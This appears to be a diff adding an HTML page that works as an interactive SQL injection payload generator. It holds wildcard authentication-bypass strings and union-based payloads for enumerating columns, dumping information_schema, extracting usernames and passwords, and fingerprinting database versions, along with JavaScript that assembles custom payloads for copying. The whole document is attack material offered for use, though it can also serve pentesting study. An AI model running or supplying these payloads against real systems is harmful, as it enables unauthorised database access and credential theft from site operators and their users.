+                    <label for="Bypass-Query-16">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-16">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>userid like '%' :</strong> This condition is attempting to match any value in the 'userid'
+                    column because '%' is a wildcard character in SQL that matches any sequence of characters.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Wildcard User Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-17" value="' or user like '%'"
+                      readonly />
+                    <label for="Bypass-Query-17">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-17">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>user like '%' :</strong> This condition is attempting to match any value in the 'user'
+                    column because '%' is a wildcard character in SQL that matches any sequence of characters.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Custom Wildcard Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-18"
+                      value="' or username like '%'" readonly />
+                    <label for="Bypass-Query-18">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-18">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="Column-Name" class="input-group-text">Enter Column Name:</label>
+                      <input type="text" id="Column-Name" class="form-control" placeholder="e.g., username">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="Wildcard-Value" class="input-group-text">Wildcard Value:</label>
+                      <input type="text" id="Wildcard-Value" class="form-control" placeholder="e.g., %">
+                    </div>
+                  </div>
+                  <div>
+                    </br>
+                    <button class="back-button" type="button" onclick="generateCustomQuery()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, allowing multiple conditions to be
+                    evaluated, where if any condition is true, the overall condition becomes true.</br></br>
+                    <strong>Column Name + LIKE + Wildcard Value :</strong> This condition is designed to search for any
+                    value in the specified column that matches the pattern defined by the wildcard character provided by
+                    the user. The LIKE operator is used for pattern matching, and the wildcard '%' represents any
+                    sequence of characters, making the search broad and flexible.
+                  </p>
+                </div>
+              </div>
+
+              <script>
+                function generateCustomQuery() {
+                  var columnName = document.getElementById('Column-Name').value.trim();
+                  var wildcardValue = document.getElementById('Wildcard-Value').value.trim();
+
+                  if (columnName === '' || wildcardValue === '') {
+                    alert('Please enter both the column name and wildcard value.');
+                    return;
+                  }
+
+                  var customQuery = "' or " + columnName + " like '%" + wildcardValue + "'";
+                  document.getElementById('Bypass-Query-18').value = customQuery;
+
+                  // Show the explanation
+                  document.querySelector('.explanation').style.display = 'block';
+                }
+              </script>
+
+            </div>
+          </div>
+        </div>
+
+        <div id="Union-Injections" class="tabcontent">
+          <h3>Union Injections</h3>
+          <div class="tabs-container">
+            <div class="tabs scroll">
+              <div class="tab active">Order By</div>
+              <div class="tab">Union Select Null</div>
+              <div class="tab">Union Dump Information Schema</div>
+              <div class="tab">Union Dump Table Names</div>
+              <div class="tab">Union Dump Column Names</div>
+              <div class="tab">Union Data Dump 1</div>
+              <div class="tab">Union Data Dump 2</div>
+              <div class="tab">Union Data Dump 3</div>
+              <div class="tab">Union Data Dump 4</div>
+              <div class="tab">Union Custom Data Dump</div>
+              <div class="tab">Union Select Database Version 1</div>
+              <div class="tab">Union Select Database Version 2</div>
+              <div class="tab">Union Select Database Version 3</div>
+            </div>
+
+            <div class="content-container scroll">
+              <div class="content">
+                <h3>Order By</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-1" value="1' ORDER BY 1--"
+                      readonly />
+                    <label for="Union-Query-1">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-1">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="OrderBy-Number" class="input-group-text">Order By Number:</label>
+                      <input type="number" id="OrderBy-Number" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="comment-options-1" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-1">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    </br>
+                    <button class="back-button" type="button" onclick="generateUnionOrderBy()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' ORDER BY 1-- :</strong> This query attempts to perform a Union Attack by adding an ORDER
+                    BY clause with the number 1, which is commonly used for testing the vulnerability.</br></br>
+                    The user can input a number to dynamically change the ORDER BY clause in the query, allowing for
+                    potential exploitation of SQL injection vulnerabilities through
+                    Union Attacks.
+                  </p>
+                </div>
+              </div>
+              <script>
+                function generateUnionOrderBy() {
+                  var orderByNumber = document.getElementById('OrderBy-Number').value.trim();
+                  var commentOption = document.getElementById('comment-options-1').value;
+
+                  if (orderByNumber === '') {
+                    alert('Please enter the Order By number.');
+                    return;
+                  }
+
+                  var unionQuery = "1' ORDER BY " + orderByNumber + commentOption;
+                  document.getElementById('Union-Query-1').value = unionQuery;
+
+                  // Show the explanation
+                  document.querySelector('.explanation').style.display = 'block';
+                }
+              </script>
+
+              <div class="content">
+                <h3>Union Select Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-2" value="1' UNION SELECT NULL--"
+                      readonly />
+                    <label for="Union-Query-2">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-2">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="Num-Nulls" class="input-group-text">Number of NULLs:</label>
+                      <input type="number" id="Num-Nulls" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="comment-options-2" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-2">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    </br>
+                    <button class="back-button" type="button" onclick="generateUnionSelectNull()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' UNION SELECT null-- :</strong> This query attempts to perform a Union Select Null
+                    Injection by
+                    appending a UNION SELECT statement with the specified number of NULL values, which is commonly
+                    used to determine
+                    the number of columns in a SQL injection vulnerability.</br></br>
+                    The user can input the number of NULL values to be included in the UNION SELECT statement,
+                    allowing for
+                    customization of the injection query for column enumeration.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Union Dump Information Schema</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-4"
+                      value="1' UNION SELECT * FROM information_schema.tables--" readonly />
+                    <label for="Union-Query-4">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-4">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-3" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-3">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="back-button" type="button" onclick="generateUnionDumpInformationSchema()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' UNION SELECT * FROM information_schema.tables-- :</strong> This query attempts to
+                    perform a
+                    Union Select Injection by appending a UNION SELECT statement to retrieve all columns from the
+                    'information_schema.tables' table, which contains metadata about database tables.</br></br>
+                    The user can select a comment type to be appended to the injection query, allowing for customization
+                    based on the SQL dialect being targeted.
+                  </p>
+                </div>
+              </div>
+
+              <script>
+                function generateUnionDumpInformationSchema() {
+                  var commentOption = document.getElementById('comment-options-3').value;
+
+                  var unionQuery = "1' UNION SELECT * FROM information_schema.tables" + commentOption;
+                  document.getElementById('Union-Query-9').value = unionQuery;
+
+                  // Show the explanation
+                  document.querySelector('.explanation').style.display = 'block';
+                }
+              </script>
+
+              <div class="content">
+                <h3>Union Dump Table Names</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-5"
+                      value="1' UNION SELECT * FROM information_schema.tables WHERE table_name = 'Users'--" readonly />
+                    <label for="Union-Query-5">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-5">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="TableName" class="input-group-text">Table Name:</label>
+                      <input type="text" id="TableName" class="form-control" placeholder="e.g., Users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-4" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-4">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="back-button" type="button" onclick="generateUnionInfoSchemaTable()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' UNION SELECT * FROM information_schema.tables WHERE table_name = 'Users'-- :</strong>
+                    This query
+                    attempts to perform a Union Select Injection by appending a UNION SELECT statement to retrieve all
+                    columns from
+                    the 'information_schema.tables' table, filtered by the specified table name.</br></br>
+                    The user can input the table name and select a comment type to be appended to the injection query,
+                    allowing for
+                    customization based on the SQL dialect being targeted.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Union Dump Column Names</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-6"
+                      value="1' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--"
+                      readonly />
+                    <label for="Union-Query-6">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-6">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="TableName" class="input-group-text">Table Name:</label>
+                      <input type="text" id="TableName" class="form-control" placeholder="e.g., users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-5" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-5">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="back-button" type="button" onclick="generateUnionInfoSchemaColumn()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>1' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--
+                      :</strong> This
+                    query attempts to perform a Union Select Injection by appending a UNION SELECT statement to retrieve
+                    column names
+                    from the 'information_schema.columns' table, filtered by the specified table name.</br></br>
+                    The user can input the table name and select a comment type to be appended to the injection query,
+                    allowing for
+                    customization based on the SQL dialect being targeted.
+                  </p>
+                </div>
+              </div>
+
+
+              <div class="content">
+                <h3>Union Data Dump 1</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-7"
+                      value="1' UNION SELECT NULL, NULL FROM users--" readonly />
+                    <label for="Union-Query-7">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-7">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE1-Column1" class="input-group-text">Column 1:</label>
+                      <input type="text" id="UE1-Column1" class="form-control" placeholder="e.g., username">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE1-Column2" class="input-group-text">Column 2:</label>
+                      <input type="text" id="UE1-Column2" class="form-control" placeholder="e.g., password">
+                    </div>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE1-Table" class="input-group-text">Table Name:</label>
+                      <input type="text" id="UE1-Table" class="form-control" placeholder="e.g., users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-7" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-7">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="back-button" type="button" onclick="generateUnionDump1()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' UNION SELECT username, password FROM users-- :</strong> This query attempts to perform a
+                    Union Select Injection by appending a UNION SELECT statement with the specified columns from the
+                    specified table, commonly used to retrieve sensitive information such as usernames and
+                    passwords.</br></br>
+                    The user can input the table name and the names of the columns to be included in the UNION SELECT
+                    statement, allowing for customization of the injection query to fetch desired data.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Union Data Dump 2</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-8"
+                      value="1' UNION SELECT NULL, NULL, NULL FROM users--" readonly />
+                    <label for="Union-Query-8">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-8">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE2-Column1" class="input-group-text">Column 1:</label>
+                      <input type="text" id="UE1-Column1" class="form-control" placeholder="e.g., username">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE2-Column2" class="input-group-text">Column 2:</label>
+                      <input type="text" id="UE1-Column2" class="form-control" placeholder="e.g., password">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE2-Column3" class="input-group-text">Column 3:</label>
+                      <input type="text" id="UE1-Column3" class="form-control" placeholder="e.g., email">
+                    </div>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UE2-Table" class="input-group-text">Table Name:</label>
+                      <input type="text" id="UE1-Table" class="form-control" placeholder="e.g., users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-8" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-8">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="back-button" type="button" onclick="generateUnionDump2()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p>This query attempts to perform a Union Select Injection by appending a UNION SELECT statement with
+                    the specified columns from the specified table, commonly used to retrieve sensitive information such
+                    as usernames, passwords, and emails.</br></br>
+                    The user can input the table name and the names of the columns to be included in the UNION SELECT
+                    statement, allowing for customization of the injection query to fetch desired data.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Union Data Dump 3</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-9"
+                      value="1' UNION SELECT NULL, NULL, NULL, NULL FROM users--" readonly />
+                    <label for="Union-Query-9">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-9">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD3-Column1" class="input-group-text">Column 1:</label>
+                      <input type="text" id="UD3-Column1" class="form-control" placeholder="e.g., id">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD3-Column2" class="input-group-text">Column 2:</label>
+                      <input type="text" id="UD3-Column2" class="form-control" placeholder="e.g., username">
+                    </div>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD3-Column3" class="input-group-text">Column 3:</label>
+                      <input type="text" id="UD3-Column3" class="form-control" placeholder="e.g., email">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD3-Column4" class="input-group-text">Column 4:</label>
+                      <input type="text" id="UD3-Column4" class="form-control" placeholder="e.g., password">
+                    </div>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD3-Table" class="input-group-text">Table Name:</label>
+                      <input type="text" id="UD3-Table" class="form-control" placeholder="e.g., users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-9" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-9">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="back-button" type="button" onclick="generateUnionDump3()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' UNION SELECT column1, column2, column3, column4 FROM table_name-- :</strong> This query
+                    template is designed to facilitate the extraction of data across four specified columns from a
+                    user-defined table. By adapting the query with real column and table names, users can tailor the SQL
+                    injection to meet the specific needs of their data retrieval.</p>
+                </div>
+              </div>
+
+
+              <div class="content">
+                <h3>Union Data Dump 4</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-10"
+                      value="1' UNION SELECT NULL, NULL, NULL, NULL, NULL FROM users--" readonly />
+                    <label for="Union-Query-10">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Union-Query-10">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD4-Column1" class="input-group-text">Column 1:</label>
+                      <input type="text" id="UD4-Column1" class="form-control" placeholder="e.g., id">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD4-Column2" class="input-group-text">Column 2:</label>
+                      <input type="text" id="UD4-Column2" class="form-control" placeholder="e.g., username">
+                    </div>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD4-Column3" class="input-group-text">Column 3:</label>
+                      <input type="text" id="UD4-Column3" class="form-control" placeholder="e.g., email">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD4-Column4" class="input-group-text">Column 4:</label>
+                      <input type="text" id="UD4-Column4" class="form-control" placeholder="e.g., password">
+                    </div>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD4-Column5" class="input-group-text">Column 5:</label>
+                      <input type="text" id="UD4-Column5" class="form-control" placeholder="e.g., status">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="UD4-Table" class="input-group-text">Table Name:</label>
+                      <input type="text" id="UD4-Table" class="form-control" placeholder="e.g., users">
+                    </div>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-10" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-10">
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <br>
+                    <button class="back-button" type="button" onclick="generateUnionDump4()">Generate
+                      Query</button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p>This section allows for the dynamic generation of a SQL injection query aimed at extracting data
+                    from five specified columns within a user-selected table. The inclusion of default 'NULL' values for
+                    unspecified columns ensures flexibility and adaptability in query formulation.</p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Union Custom Data Dump</h3>
+                <div id="columnInputs" class="row">
+                  <div class="input-group">
+                    <span class="input-group-text">Query:</span>
+                    <div class="form-floating">
+                      <input type="text" class="form-control-plaintext" id="Custom-Union-Dump-Query"
+                        value="1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL FROM users--" readonly />
+                      <label for="Custom-Union-Dump-Query">SQL</label>
+                    </div>
+                    <div class="copy">
+                      <button class="btn btn-outline-secondary light" type="button" id="Copy"
+                        data-id="Custom-Union-Dump-Query">
+                        <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                    </div>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <button onclick="addColumn()" class="btn btn-primary">Add Column</button>
+                    <button onclick="removeColumn()" class="btn btn-danger ml-2">Remove Column</button>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="tableName" class="input-group-text">Table Name:</label>
+                      <input type="text" id="tableName" class="form-control" placeholder="e.g., users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="commentType" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="commentType">
+                        <option value="--">--</option>
+                        <option value="#">#</option>
+                        <option value="/*">/*</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <button onclick="generateQuery()" class="back-button">Generate Query</button>
+                  </div>
+                </div>
+              </div>
+
+              <script>
+                let columnCount = 0;
+
+                function addColumn() {
+                  columnCount++;
+                  const columnInputContainer = document.getElementById('columnInputs');
+
+                  // Create the wrapper div for the new input group
+                  const newInputGroup = document.createElement('div');
+                  newInputGroup.setAttribute('class', 'input-group mt-3');
+
+                  // Create the label for the input
+                  const newLabel = document.createElement('label');
+                  newLabel.setAttribute('for', `Custom-Union-Column${columnCount}`);
+                  newLabel.setAttribute('class', 'input-group-text');
+                  newLabel.textContent = `Column ${columnCount}:`;
+
+                  // Create the input field
+                  const newInput = document.createElement('input');
+                  newInput.setAttribute('type', 'text');
+                  newInput.setAttribute('id', `Custom-Union-Column${columnCount}`);
+                  newInput.setAttribute('class', 'form-control');
+
+                  // Append the label and input to the input group
+                  newInputGroup.appendChild(newLabel);
+                  newInputGroup.appendChild(newInput);
+
+                  // Append the new input group to the columnInputs container
+                  columnInputContainer.appendChild(newInputGroup);
+                }
+
+
+                function removeColumn() {
+                  if (columnCount > 0) {
+                    // Ensure the correct ID format is used for removal as well
+                    const elementToRemove = document.getElementById(`Custom-Union-Column${columnCount}`).parentNode; // Get the parent div (input-group) to remove the whole group
+                    elementToRemove.remove();
+                    columnCount--;
+                  }
+                }
+
+                function generateQuery() {
+                  const tableName = document.getElementById('tableName').value || 'users';
+                  const commentType = document.getElementById('commentType').value;
+                  let columnValues = [];
+                  for (let i = 1; i <= columnCount; i++) {
+                    // Update the element ID format to match what's used in addColumn
+                    const inputValue = document.getElementById(`Custom-Union-Column${i}`).value || 'NULL';
+                    columnValues.push(inputValue);
+                  }
+                  const query = `1' UNION SELECT ${columnValues.join(', ')} FROM ${tableName} ${commentType}`;
+                  document.getElementById('Custom-Union-Dump-Query').value = query;
+                }
+
+                addColumn();
+              </script>
+
+              <div class="content">
+                <h3>Union Select Database Version 1</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-11"
+                      value="' UNION SELECT @@version--" readonly />
+                    <label for="Union-Query-11">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary" type="button" id="Copy" data-id="Union-Query-11">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-11" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-11">
+                        <option value="--">--</option>
+                        <option value="#">#</option>
+                        <option value="/*">/*</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  <br>
+                  <button class="back-button" type="button" onclick="generateVersionQuery1()">Generate
+                    Query</button>
+                </div>
+                <div class="explanation">
+                  <p><strong>' UNION SELECT @@version-- :</strong> This query template is designed to extract the
+                    database version using the `@@version` function in SQL. By appending a UNION SELECT statement, it
+                    combines the query with the specified comment type to bypass filters or restrictions and retrieve
+                    sensitive information.</p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Union Select Database Version 2</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-12"
+                      value="' UNION SELECT * FROM v$version--" readonly />
+                    <label for="Union-Query-12">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary" type="button" id="Copy" data-id="Union-Query-12">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-12" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-12">
+                        <option value="--">--</option>
+                        <option value="#">#</option>
+                        <option value="/*">/*</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  <br>
+                  <button class="back-button" type="button" onclick="generateVersionQuery2()">Generate
+                    Query</button>
+                </div>
+                <div class="explanation">
+                  <p><strong>' UNION SELECT * FROM v$version-- :</strong> This query template is designed to retrieve
+                    the database version using the `v$version` table or view in SQL. By appending a UNION SELECT
+                    statement with wildcard (*) selection, it combines the query with the specified comment type to
+                    bypass filters or restrictions and fetch sensitive information.</p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Union Select Database Version 3</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Union-Query-13"
+                      value="' UNION SELECT * FROM version()--" readonly />
+                    <label for="Union-Query-13">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary" type="button" id="Copy" data-id="Union-Query-13">
+                      <span class="copytext">Copy to clipboard</span> Copy Text
+                    </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="comment-options-13" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-13">
+                        <option value="--">--</option>
+                        <option value="#">#</option>
+                        <option value="/*">/*</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  <br>
+                  <button class="back-button" type="button" onclick="generateVersionQuery3()">Generate
+                    Query</button>
+                </div>
+                <div class="explanation">
+                  <p><strong>' UNION SELECT * FROM version()-- :</strong> This query template is designed to retrieve
+                    the database version using the `version()` function in SQL. By appending a UNION SELECT statement
+                    with wildcard (*) selection from the version function, it combines the query with the specified
+                    comment type to bypass filters or restrictions and fetch sensitive information.</p>
+                </div>
+              </div>
+
+
+
+
+
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- Union Injection end -->
+  </div>
+  <!-- body end -->
+
+  <div class="btm">
+    <form action="index.html" method="GET">
+      <button type="submit" class="back-button">&laquo; Back</button>
+    </form>
+  </div>
+
+  <!-- footer -->
+  <div class="btm light footer">
+    <p>Created by Fedwig</p>
+  </div>
+  <!-- footer end -->
+  </div>
+</body>
+
+</html>
